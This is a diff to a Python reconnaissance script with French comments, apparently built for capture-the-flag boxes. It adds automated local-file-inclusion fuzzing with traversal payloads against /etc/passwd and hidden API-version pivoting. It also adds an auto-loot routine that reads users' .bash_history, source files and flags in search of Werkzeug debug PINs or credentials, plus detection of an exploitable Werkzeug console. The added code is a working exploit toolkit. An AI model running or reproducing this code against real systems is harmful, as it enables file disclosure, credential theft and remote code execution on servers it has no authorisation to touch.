@@ -30,7 +30,7 @@ import time
 import shutil
 import subprocess
 import http.client
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ----------------------------------------------------------------------
@@ -513,6 +513,143 @@ def fuzz_routes(base, args):
     return hits
 
 # ----------------------------------------------------------------------
+# G. LFI sur parametres + PIVOT DE VERSION (leçon Bookstore : la faille etait
+#    sur /api/v1/... alors que la doc annoncait v2 ; param cache "show")
+# ----------------------------------------------------------------------
+LFI_PARAMS = ["show", "file", "path", "page", "doc", "document", "view",
+              "template", "load", "read", "download", "filename", "include",
+              "name", "folder", "dir", "item", "resource", "content", "data",
+              "cat", "conf", "config", "action", "detail", "src", "log", "img"]
+LFI_PAYLOADS = ["/etc/passwd",
+                "../../../../../../../../etc/passwd",
+                "....//....//....//....//....//....//etc/passwd",
+                "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"]
+PASSWD_RX = re.compile(r"root:.*?:0:0:")
+
+def _version_variants(path):
+    """/api/v2/resources/books -> variantes v0..v4 du meme chemin (versions cachees)."""
+    m = re.search(r"/v(\d+)/", path)
+    if not m:
+        return {path}
+    out = {path}
+    for n in range(0, 5):
+        out.add(path[:m.start()] + f"/v{n}/" + path[m.end():])
+    return out
+
+def harvest_doc_endpoints(base, args):
+    """Extrait les chemins d'API cites dans la doc/HTML (/, /api, robots.txt) —
+    beaucoup d'API listent leurs routes en clair. Genere les variantes de version."""
+    paths = set()
+    for p in ("", "api", "api/", "docs", "api/docs", "robots.txt", "swagger.json"):
+        r = http_req(f"{base}/{p}", timeout=args.timeout)
+        if not r or r["status"] == 404:
+            continue
+        bt = r["body"].decode("utf-8", "ignore")
+        for m in re.finditer(r"/(?:api|rest|v\d+)/[A-Za-z0-9_./-]+", bt):
+            path = m.group(0).split("?")[0].rstrip("/.")
+            if 4 < len(path) < 120:
+                paths.add(path)
+    pivoted = set()
+    for p in paths:
+        pivoted |= _version_variants(p)
+    return paths, pivoted
+
+def probe_lfi(base, args, extra=None):
+    """Fuzz des parametres LFI (show/file/path...) sur les endpoints connus + les
+    versions pivotees, avec payloads de traversal. Detecte /etc/passwd."""
+    log(f"\n{C.B}{C.BD}[G] LFI sur parametres + pivot de version...{C.X}")
+    doc_paths, pivoted = harvest_doc_endpoints(base, args)
+    cand = set(pivoted) | set(doc_paths) | set(extra or [])
+    # fallback si la doc ne liste rien : quelques bases classiques
+    if not cand:
+        cand = {"/api/v1/resources/books", "/api/v2/resources/books",
+                "/api", "/download", "/file", "/view"}
+    jobs = []
+    for ep in sorted(cand):
+        ep = "/" + ep.lstrip("/")
+        for param in LFI_PARAMS:
+            jobs.append((ep, param))
+    hits, found_ep = [], set()
+    def check(job):
+        ep, param = job
+        if ep in found_ep:                       # un param LFI deja trouve ici
+            return None
+        for pl in LFI_PAYLOADS:
+            r = http_req(f"{base}{ep}?{param}={quote(pl, safe='')}",
+                         timeout=args.timeout, max_body=8192)
+            if r and PASSWD_RX.search(r["body"].decode("utf-8", "ignore")):
+                return {"endpoint": ep, "param": param, "payload": pl}
+        return None
+    with ThreadPoolExecutor(max_workers=args.threads) as ex:
+        for fu in as_completed([ex.submit(check, j) for j in jobs]):
+            r = fu.result()
+            if r and r["endpoint"] not in found_ep:
+                found_ep.add(r["endpoint"])
+                hits.append(r)
+                log(f"    {C.R}{C.BD}LFI !{C.X}  {r['endpoint']}?{C.Y}{r['param']}"
+                    f"{C.X}={r['payload']}")
+    if not hits:
+        log(f"  {C.GR}(aucune LFI detectee sur les parametres testes){C.X}")
+    return hits
+
+def loot_lfi(base, args, lfi):
+    """Une fois la LFI confirmee : lit /etc/passwd -> homes, puis tente
+    user.txt / .bash_history / le code source (souvent le PIN Werkzeug ou des creds)."""
+    if not lfi:
+        return []
+    ep, param = lfi[0]["endpoint"], lfi[0]["param"]
+    def read(pathfile):
+        pl = "../" * 10 + pathfile.lstrip("/") if not pathfile.startswith("/") else pathfile
+        r = http_req(f"{base}{ep}?{param}={quote(pathfile, safe='')}",
+                     timeout=args.timeout, max_body=20000)
+        return r["body"].decode("utf-8", "ignore") if r and r["status"] == 200 else ""
+    log(f"\n{C.B}{C.BD}[G+] Auto-loot via la LFI ({ep}?{param}=)...{C.X}")
+    loot = []
+    passwd = read("/etc/passwd")
+    homes = re.findall(r"^([^:]+):x:\d{4,}:\d+:[^:]*:(/home/[^:]+):", passwd, re.M)
+    for user, home in homes:
+        for f in (f"{home}/user.txt", f"{home}/.bash_history",
+                  f"{home}/api.py", f"{home}/app.py", f"{home}/api-up.sh"):
+            c = read(f)
+            if c.strip():
+                loot.append({"file": f, "content": c[:2000]})
+                flag = re.search(r"\b[0-9a-f]{32}\b", c)
+                pin = re.search(r"WERKZEUG_DEBUG_PIN\s*=\s*([\d-]+)", c)
+                tag = ""
+                if f.endswith("user.txt") and flag:
+                    tag = f"  {C.G}{C.BD}<- FLAG {flag.group(0)}{C.X}"
+                elif pin:
+                    tag = f"  {C.R}{C.BD}<- PIN Werkzeug {pin.group(1)}{C.X}"
+                log(f"    {C.G}lu{C.X} {f}  {C.GR}({len(c)} o){C.X}{tag}")
+    if not loot:
+        log(f"  {C.GR}(rien de lisible dans les homes){C.X}")
+    return loot
+
+# ----------------------------------------------------------------------
+# H. Console de debug Werkzeug (RCE si PIN devine/fixe)
+# ----------------------------------------------------------------------
+def check_werkzeug(base, args):
+    log(f"\n{C.B}{C.BD}[H] Console de debug Werkzeug...{C.X}")
+    r = http_req(f"{base}/console", timeout=args.timeout)
+    info = {}
+    if r and (b"Werkzeug" in r["body"] or b"__debugger__" in r["body"]
+              or b"pin-prompt" in r["body"]):
+        bt = r["body"].decode("utf-8", "ignore")
+        locked = "Console Locked" in bt or "pin-prompt" in bt
+        sec = re.search(r'SECRET\s*=\s*"([^"]+)"', bt)
+        info = {"present": True, "locked": locked,
+                "secret": sec.group(1) if sec else None}
+        log(f"    {C.R}{C.BD}Console Werkzeug presente sur /console{C.X}"
+            f"  ({'verrouillee' if locked else 'DEVERROUILLEE !'})")
+        if info["secret"]:
+            log(f"    {C.Y}SECRET = {info['secret']}{C.X}")
+        log(f"    {C.GR}-> RCE si PIN trouve : cherche WERKZEUG_DEBUG_PIN dans "
+            f"les scripts (via LFI) ou calcule-le (machine-id+mac).{C.X}")
+    else:
+        log(f"  {C.GR}(pas de console Werkzeug){C.X}")
+    return info
+
+# ----------------------------------------------------------------------
 def save_report(base, data, out):
     b = out.rsplit(".", 1)[0]
     with open(b + ".json", "w", encoding="utf-8") as f:
@@ -534,6 +671,19 @@ def save_report(base, data, out):
                     f.write(f"    classpath: {d['classpath']}\n")
                 f.write(f"    champs requis: {', '.join(d['fields']) or '(aucun)'}\n")
                 f.write(f"    validation (status {d['final_status']}): {d['final_body'][:160]}\n")
+        if data.get("lfi"):
+            f.write("\n[LFI (parametres)]\n")
+            for l in data["lfi"]:
+                f.write(f"  {l['endpoint']}?{l['param']}={l['payload']}\n")
+        if data.get("lfi_loot"):
+            f.write("\n[Fichiers lus via LFI]\n")
+            for lt in data["lfi_loot"]:
+                f.write(f"  --- {lt['file']} ---\n{lt['content']}\n")
+        if data.get("werkzeug", {}).get("present"):
+            w = data["werkzeug"]
+            f.write(f"\n[Console Werkzeug] /console  "
+                    f"({'verrouillee' if w.get('locked') else 'DEVERROUILLEE'})"
+                    f"  SECRET={w.get('secret')}\n")
         f.write("\n[Routes fuzz]\n")
         for h in data["fuzz"]:
             f.write(f"  {h['status']}  /{h['path']}\n")
@@ -584,6 +734,8 @@ def main():
     p.add_argument("-H", "--header", action="append", default=[],
                    help="Header custom 'Nom: valeur' (repetable, ex: X-HackerOne-Research)")
     p.add_argument("--fuzz", action="store_true", help="Activer le fuzzing des routes (SecLists)")
+    p.add_argument("--no-lfi", action="store_true",
+                   help="Desactiver le test LFI (parametres show/file...) + pivot de version + console Werkzeug")
     p.add_argument("--seclists", help="Chemin de SecLists si non trouve")
     p.add_argument("-t", "--threads", type=int, default=40, help="Threads (defaut 40)")
     p.add_argument("--timeout", type=float, default=10, help="Timeout par requete (defaut 10)")
@@ -609,7 +761,8 @@ def main():
     start = time.time()
 
     data = {"target": base, "schemas": [], "endpoints": [], "versions": [],
-            "graphql": [], "juicy": [], "fuzz": [], "dto": []}
+            "graphql": [], "juicy": [], "fuzz": [], "dto": [],
+            "lfi": [], "lfi_loot": [], "werkzeug": {}}
 
     # A. schemas + parse
     schemas = find_schemas(base, args)
@@ -640,6 +793,17 @@ def main():
                 eps.append(path)
         data["dto"] = run_dto(base, eps, args)
 
+    # G. LFI sur parametres + pivot de version (actif par defaut)
+    if not args.no_lfi:
+        endpoint_paths = [path for _, path in data["endpoints"]]
+        data["lfi"] = probe_lfi(base, args, extra=endpoint_paths)
+        if data["lfi"]:
+            data["lfi_loot"] = loot_lfi(base, args, data["lfi"])
+
+    # H. Console de debug Werkzeug (RCE)
+    if not args.no_lfi:
+        data["werkzeug"] = check_werkzeug(base, args)
+
     # E. fuzz
     if args.fuzz:
         data["fuzz"] = fuzz_routes(base, args)
@@ -654,6 +818,20 @@ def main():
     gql = sum(1 for g in data['graphql'] if g['introspection'])
     log(f"  GraphQL introspection : {(C.R+'OUI'+C.X) if gql else 'non'}")
     log(f"  Endpoints juteux      : {C.Y}{len(data['juicy'])}{C.X}")
+    if data["lfi"]:
+        l = data["lfi"][0]
+        log(f"  LFI                   : {C.R}{C.BD}OUI{C.X} "
+            f"({l['endpoint']}?{l['param']}=)")
+    if data["werkzeug"].get("present"):
+        st = "DEVERROUILLEE" if not data["werkzeug"].get("locked") else "verrouillee"
+        log(f"  Console Werkzeug      : {C.R}OUI{C.X} ({st})")
+    for lt in data["lfi_loot"]:
+        fl = re.search(r"\b[0-9a-f]{32}\b", lt["content"])
+        pin = re.search(r"WERKZEUG_DEBUG_PIN\s*=\s*([\d-]+)", lt["content"])
+        if lt["file"].endswith("user.txt") and fl:
+            log(f"  {C.G}{C.BD}>>> USER FLAG : {fl.group(0)}{C.X}  ({lt['file']})")
+        if pin:
+            log(f"  {C.R}{C.BD}>>> PIN Werkzeug : {pin.group(1)}{C.X}  ({lt['file']})")
     if data.get("dto"):
         tot_fields = sum(len(d["fields"]) for d in data["dto"])
         log(f"  DTO reconstruits      : {C.G}{len(data['dto'])}{C.X} "
